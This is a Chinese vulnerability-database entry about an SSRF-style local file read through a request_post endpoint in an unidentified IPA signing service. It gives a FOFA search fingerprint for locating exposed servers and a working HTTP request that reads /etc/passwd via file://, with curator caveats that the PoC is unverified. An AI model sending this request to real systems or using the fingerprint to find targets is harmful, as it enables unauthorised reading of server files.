---
source: "wy876 漏洞文库"
title: "第三方IPA签名服务（具体产品待核） request_post file协议本地文件读取"
product: "第三方IPA签名服务（具体产品待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，服务端URL客户端支持file协议/Linux"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/haxm2dna8vo9em9h"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7request_post%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/assets/index/css/mobileSelect.css\""
fofa_unverified: "body="
id: "vw-e6c3dc395458cb0709ed5d16"
entity_id: "ve-e6c3dc395458cb0709ed5d16"
schema_version: "1"
---

# 第三方IPA签名服务（具体产品待核） request_post file协议本地文件读取

## 条目说明

- 对象与具体问题：第三方IPA签名服务（具体产品待核）；request_post file协议本地文件读取
- 版本、配置及部署条件：版本未知，服务端URL客户端支持file协议/Linux
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题苹果iOS端不能证明Apple官方产品；实际HTTP服务端读取与iOS客户端漏洞应区分
- 可归SSRF导致本地文件读取候选，缺协议限制/返回/源码证据
- 版本产品名末尾r残片，通用mobileSelect指纹不足唯一身份；补版本修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
苹果IOS端IPA签名工具request_post任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## 二、影响版本
+ 苹果IOS端IPA签名工具r

## 三、资产测绘
+ fofa`body="/assets/index/css/mobileSelect.css"`
+ 特征


## 四、漏洞复现
```http
GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/haxm2dna8vo9em9h>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
